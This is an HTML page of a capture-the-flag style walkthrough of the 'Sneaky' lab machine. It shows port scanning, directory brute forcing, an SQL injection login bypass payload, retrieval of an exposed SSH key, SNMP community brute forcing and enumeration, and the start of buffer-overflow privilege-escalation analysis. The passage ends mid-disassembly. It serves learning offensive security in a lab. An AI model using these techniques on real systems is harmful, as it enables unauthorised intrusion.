<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><title>Sneaky | TheCaretaker</title><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Sneaky" /><meta name="author" content="Deepak Dhasmana" /><meta property="og:locale" content="en_US" /><meta name="description" content="Masscan + Nmap" /><meta property="og:description" content="Masscan + Nmap" /><link rel="canonical" href="https://0xcaretaker.github.io/posts/Sneaky/" /><meta property="og:url" content="https://0xcaretaker.github.io/posts/Sneaky/" /><meta property="og:site_name" content="TheCaretaker" /><meta property="og:image" content="https://0xcaretaker.github.io/assets/img/Posts/Sneaky/Sneaky.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-07-22T20:11:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://0xcaretaker.github.io/assets/img/Posts/Sneaky/Sneaky.png" /><meta property="twitter:title" content="Sneaky" /><meta name="twitter:site" content="@0xCaretaker" /><meta name="twitter:creator" content="@Deepak Dhasmana" /><meta name="google-site-verification" content="qxu37CH4WxgxVlq54JzTLwQ-GdVvbJNhJsDxYZsYA48" /> <script type="application/ld+json"> {"headline":"Sneaky","dateModified":"2021-07-22T20:11:00+05:30","datePublished":"2021-07-22T20:11:00+05:30","image":"https://0xcaretaker.github.io/assets/img/Posts/Sneaky/Sneaky.png","author":{"@type":"Person","name":"Deepak Dhasmana"},"@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xcaretaker.github.io/posts/Sneaky/"},"description":"Masscan + Nmap","url":"https://0xcaretaker.github.io/posts/Sneaky/","@context":"https://schema.org"}</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="google-site-verification" content="qxu37CH4WxgxVlq54JzTLwQ-GdVvbJNhJsDxYZsYA48" /><title>Sneaky | TheCaretaker</title><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Sneaky" /><meta name="author" content="Deepak Dhasmana" /><meta property="og:locale" content="en_US" /><meta name="description" content="Masscan + Nmap" /><meta property="og:description" content="Masscan + Nmap" /><link rel="canonical" href="https://0xcaretaker.github.io/posts/Sneaky/" /><meta property="og:url" content="https://0xcaretaker.github.io/posts/Sneaky/" /><meta property="og:site_name" content="TheCaretaker" /><meta property="og:image" content="https://0xcaretaker.github.io/assets/img/Posts/Sneaky/Sneaky.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-07-22T20:11:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://0xcaretaker.github.io/assets/img/Posts/Sneaky/Sneaky.png" /><meta property="twitter:title" content="Sneaky" /><meta name="twitter:site" content="@0xCaretaker" /><meta name="twitter:creator" content="@Deepak Dhasmana" /><meta name="google-site-verification" content="qxu37CH4WxgxVlq54JzTLwQ-GdVvbJNhJsDxYZsYA48" /> <script type="application/ld+json"> {"headline":"Sneaky","dateModified":"2021-07-22T20:11:00+05:30","datePublished":"2021-07-22T20:11:00+05:30","image":"https://0xcaretaker.github.io/assets/img/Posts/Sneaky/Sneaky.png","author":{"@type":"Person","name":"Deepak Dhasmana"},"@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xcaretaker.github.io/posts/Sneaky/"},"description":"Masscan + Nmap","url":"https://0xcaretaker.github.io/posts/Sneaky/","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">TheCaretaker</a></div><div class="site-subtitle font-italic">Penetration Tester | Ethical Hacker | CTF Player</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-home"></i> HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-stream"></i> CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-tags"></i> TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-archive"></i> ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-id-card"></i> ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/0xCaretaker" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/0xCaretaker" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['deepakdhasmana0007','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="https://www.hackthebox.eu/profile/371479" target="_blank"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/deepak-dhasmana/" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Sneaky</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Sneaky</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Jul 22, 2021, 8:11 PM +0530" > Jul 22, 2021 <i class="unloaded">2021-07-22T20:11:00+05:30</i> </span> by <span class="author"> Deepak Dhasmana </span></div></div><div class="post-content"> <img src="/assets/img/Posts/Sneaky/Sneaky.png" class="post-preview-img"><h1 id="masscan--nmap">Masscan + Nmap</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>masscan <span class="nt">-p1-65535</span>,U:1-65535 <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">--rate</span><span class="o">=</span>10000 <span class="nt">-e</span> tun0 | <span class="nb">tee </span>masscan.out
Scanning 1 hosts <span class="o">[</span>131070 ports/host]
Discovered open port 161/udp on 10.10.10.20
Discovered open port 80/tcp on 10.10.10.20
</pre></table></code></div></div><p>Parse those ports to nmap:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
</pre><td class="rouge-code"><pre><span class="nv">ports</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>masscan.out |awk <span class="s1">'{ print $4 }'</span> | <span class="nb">sed</span> <span class="s1">'s/\/tcp//;s/\/udp//'</span> | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed</span> <span class="s1">'s/,$//'</span><span class="si">)</span>
nmap <span class="nt">-sVCTU</span> <span class="nt">--min-rate</span> 1000 <span class="nt">-p</span> <span class="nv">$ports</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-oN</span> nmap-fullscan.out
PORT    STATE  SERVICE VERSION
PORT    STATE  SERVICE VERSION
80/tcp  open   http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Under Development!
161/udp open   snmp    SNMPv1 server<span class="p">;</span> net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: fcf2da02d0831859
|   snmpEngineBoots: 8
|_  snmpEngineTime: 3m31s
| snmp-netstat:
|   TCP  127.0.0.1:3306       0.0.0.0:0
|_  UDP  0.0.0.0:161          <span class="k">*</span>:<span class="k">*</span>
| snmp-processes:
|   1:
|     Name: init
|     Path: /sbin/init
|   407:
|     Name: upstart-udev-br
|     Path: upstart-udev-bridge
|     Params: <span class="nt">--daemon</span>
|   411:
|     Name: systemd-udevd
|     Path: /lib/systemd/systemd-udevd
|     Params: <span class="nt">--daemon</span>
|   470:
|     Name: dbus-daemon
|     Path: dbus-daemon
|     Params: <span class="nt">--system</span> <span class="nt">--fork</span>
|   488:
|     Name: systemd-logind
|     Path: /lib/systemd/systemd-logind
|   492:
|     Name: rsyslogd
|     Path: rsyslogd
|   514:
|     Name: upstart-file-br
|     Path: upstart-file-bridge
|     Params: <span class="nt">--daemon</span>
|   803:
|     Name: upstart-socket-
|     Path: upstart-socket-bridge
|     Params: <span class="nt">--daemon</span>
|   947:
|     Name: getty
|     Path: /sbin/getty
|     Params: <span class="nt">-8</span> 38400 tty4
|   992:
|     Name: sshd
|     Path: /usr/sbin/sshd
|     Params: <span class="nt">-D</span>
|   995:
|     Name: cron
|     Path: cron
|   996:
|     Name: acpid
|     Path: acpid
|     Params: <span class="nt">-c</span> /etc/acpi/events <span class="nt">-s</span> /var/run/acpid.socket
|   1059:
|     Name: mysqld
|     Path: /usr/sbin/mysqld
|   1072:
|     Name: snmpd
|     Path: /usr/sbin/snmpd
|     Params: <span class="nt">-Lsd</span> <span class="nt">-Lf</span> /dev/null <span class="nt">-u</span> snmp <span class="nt">-g</span> snmp <span class="nt">-I</span> <span class="nt">-smux</span> mteTrigger mteTriggerConf <span class="nt">-p</span> /var/run/snmpd.pid
Service Info: Host: Sneaky

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>67.20 seconds
</pre></table></code></div></div><h1 id="http">HTTP</h1><p>Directory bruteforcing:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>ffuf <span class="nt">-u</span> http://10.10.10.20/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt  <span class="nt">-fc</span> 401,403,405 <span class="nt">-e</span> .txt,.php,.zip,.bak,.html

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.20/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Extensions       : .txt .php .zip .bak .html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 401,403,405
________________________________________________

index.html              [Status: 200, Size: 183, Words: 10, Lines: 12]
dev                     [Status: 301, Size: 307, Words: 20, Lines: 10]
.                       [Status: 200, Size: 183, Words: 10, Lines: 12]
:: Progress: [378522/378522] :: Job [1/1] :: 431 req/sec :: Duration: [0:14:29] :: Errors: 0 ::
</span></pre></table></code></div></div><p>Visiting /dev gives a login form. Tried common usernames and passwords, didn’t work. Let’s try for SQL injection: I tried <code class="language-plaintext highlighter-rouge">' or 1=1-- -</code> payload for password field and it logged in! Page has this content:</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>DevWebsite Login

name: admin

name: thrasivoulos

My Key

Noone is ever gonna find this key :P
</pre></table></code></div></div><p>And that <code class="language-plaintext highlighter-rouge">My Key</code> links to <code class="language-plaintext highlighter-rouge">/dev/sshkeyforadministratordifficulttimes</code> which contains private ssh key for thrasivoulos.</p><h1 id="snmp">SNMP</h1><p>Simple Network Management Protocol is a protocol used for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior. Brute forcing the community string with one-sixty-one:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>onesixtyone <span class="nt">-c</span> /opt/metasploit-framework/embedded/framework/data/wordlists/snmp_default_pass.txt <span class="sb">`</span>IP<span class="sb">`</span>
Scanning 1 hosts, 123 communities
10.10.10.20 <span class="o">[</span>public] Linux Sneaky 4.4.0-75-generic <span class="c">#96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686</span>
10.10.10.20 <span class="o">[</span>public] Linux Sneaky 4.4.0-75-generic <span class="c">#96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686</span>
</pre></table></code></div></div><p>Dumping SNMP-data:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="nv">$ </span>snmp-check <span class="nt">-p</span> 161 <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-c</span> public <span class="nt">-d</span> <span class="nt">-v</span> 3
<span class="o">[</span><span class="k">*</span><span class="o">]</span> System information:

  Host IP address               : 10.10.10.20
  Hostname                      : Sneaky
  Description                   : Linux Sneaky 4.4.0-75-generic <span class="c">#96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686</span>
  Contact                       : root
  Location                      : Unknown
  Uptime snmp                   : 00:18:48.47
  Uptime system                 : 00:18:43.51
  System <span class="nb">date</span>                   : 2021-7-21 16:29:17.0

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Processes:

  Id                    Status                Name                  Path                  Parameters
  1                     runnable              init                  /sbin/init
  992                   runnable              sshd                  /usr/sbin/sshd        <span class="nt">-D</span>
  1059                  runnable              mysqld                /usr/sbin/mysqld

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Software components:

  Index                 Name
  0                     accountsservice-0.6.35-0ubuntu7.3
  1                     acpid-1:2.0.21-1ubuntu2
  8                     apport-symptoms-0.20
  9                     apt-1.0.1ubuntu2.17
  10                    apt-transport-https-1.0.1ubuntu2.17
  383                   passwd-1:4.1.5.1-1ubuntu9.4
  384                   patch-2.7.1-4ubuntu2.3
  392                   php5-json-1.3.2-2build1
  456                   ssl-cert-1.0.33
  457                   strace-4.8-1ubuntu5
  458                   sudo-1.8.9p5-1ubuntu1.3
  467                   tcpdump-4.9.0-1ubuntu1~ubuntu14.04.1
  468                   telnet-0.17-36build2
  469                   time-1.7-24
  470                   tmux-1.8-5
  471                   tzdata-2016j-0ubuntu0.14.04
  476                   ucf-3.0027+nmu1
  477                   udev-204-5ubuntu20.24
  478                   ufw-0.34~rc-0ubuntu2
  487                   vim-common-2:7.4.052-1ubuntu3.1
  488                   vim-runtime-2:7.4.052-1ubuntu3.1
  489                   vim-tiny-2:7.4.052-1ubuntu3.1
  490                   w3m-0.5.3-15ubuntu0.1
  491                   wget-1.15-1ubuntu1.14.04.2
</pre></table></code></div></div><p>I can see MySQL running in the background.</p><p>We can even use snmpwalk for more data with <code class="language-plaintext highlighter-rouge">snmpwalk -c public -v2c IP</code>. But that shows tree structure output, which is weird to understand. To prevent that, use <code class="language-plaintext highlighter-rouge">apt install snmp-mibs-downloader</code>, then edit <code class="language-plaintext highlighter-rouge">/etc/snmp/snmp.conf</code> and comment the mibs line.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>snmpwalk <span class="nt">-c</span> public <span class="nt">-v2c</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="o">&gt;</span> snmpwalk-v2c
</pre></table></code></div></div><h1 id="finding-ipv6">Finding IPV6</h1><p>After checking out the data from snmp, I do get some IPv6 addresses:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>snmpwalk-v2c  | <span class="nb">grep</span> <span class="nt">-i</span> ipv6 | <span class="nb">grep</span> <span class="s1">'fe:80\|de:ad'</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s1">'"'</span> <span class="s1">'{print $2 }'</span>| <span class="nb">sort</span> <span class="nt">-u</span>
de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:44:ec
fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:44:ec
fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:83:d8
</pre></table></code></div></div><p>But the formatting for ipv6 address is still wrong. They should be:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>dead:beef:0000:0000:0250:56ff:feb9:44ec
fe80:0000:0000:0000:0250:56ff:feb9:44ec
fe80:0000:0000:0000:0250:56ff:feb9:83d8
</pre></table></code></div></div><p>Running nmap on all the IPv6 addresses for port 22:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>ipv6<span class="si">)</span><span class="p">;</span> <span class="k">do </span>nmap <span class="nt">-6</span> <span class="nv">$i</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-p</span> 22  <span class="p">;</span> <span class="k">done
</span>Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-22 17:05 IST

Nmap scan report <span class="k">for </span>dead:beef::250:56ff:feb9:44ec
Host is up <span class="o">(</span>0.088s latency<span class="o">)</span><span class="nb">.</span>
PORT   STATE SERVICE
22/tcp open  ssh
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>0 hosts up<span class="o">)</span> scanned <span class="k">in </span>1.53 seconds
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh <span class="nt">-i</span> ./sshkeyforadministratordifficulttimes thrasivoulos@dead:beef::250:56ff:feb9:44ec
The authenticity of host <span class="s1">'dead:beef::250:56ff:feb9:44ec (dead:beef::250:56ff:feb9:44ec)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:KCwXgk+ryPhJU+UhxyHAO16VCRFrty3aLPWPSkq/E2o.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>dead:beef::250:56ff:feb9:44ec<span class="s1">' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-75-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Wed Jul 21 16:10:30 EEST 2021

  System load: 0.0               Memory usage: 4%   Processes:       176
  Usage of /:  9.9% of 18.58GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Your Hardware Enablement Stack (HWE) is supported until April 2019.
Last login: Sun May 14 20:22:53 2017 from dead:beef:1::1077
thrasivoulos@Sneaky:~$ 
</span></pre></table></code></div></div><h1 id="privesc-using-bof">Privesc using BOF</h1><p>Checking for SUID perms, I get <code class="language-plaintext highlighter-rouge">/usr/local/bin/chal</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="nv">$ </span>find / <span class="nt">-type</span> f <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
/bin/umount
/bin/su
/bin/mount
/bin/ping6
/bin/fusermount
/bin/ping
/usr/local/bin/chal
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/bin/at
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
</pre></table></code></div></div><p>This binary is vulnerable to buffer-overflow.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>thrasivoulos@Sneaky:~<span class="nv">$ </span>/usr/local/bin/chal
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
thrasivoulos@Sneaky:~<span class="nv">$ </span>strings /usr/local/bin/chal | <span class="nb">grep </span>strcpy
strcpy
strcpy@@GLIBC_2.0
</pre></table></code></div></div><h1 id="checking-protections">Checking Protections</h1><p>It’s turned off:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>thrasivoulos@Sneaky:~<span class="nv">$ </span><span class="nb">cat</span> /proc/sys/kernel/randomize_va_space
0
</pre></table></code></div></div><p>No protections enabled:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
gdb-peda<span class="err">$</span>
</pre></table></code></div></div><h1 id="enumerating-chal">Enumerating chal</h1><p>Listing functions:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>info functions
All defined functions:

Non-debugging symbols:
0x080482b4  _init
0x080482f0  strcpy@plt
0x08048300  __gmon_start__@plt
0x08048310  __libc_start_main@plt
0x08048320  _start
0x08048350  __x86.get_pc_thunk.bx
0x08048360  deregister_tm_clones
0x08048390  register_tm_clones
0x080483d0  __do_global_dtors_aux
0x080483f0  frame_dummy
0x0804841d  main
0x08048450  __libc_csu_init
0x080484c0  __libc_csu_fini
0x080484c4  _fini
</pre></table></code></div></div><p>Disassembling main, Nothing fancy.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>disass main                                                                          
Dump of assembler code <span class="k">for function </span>main:
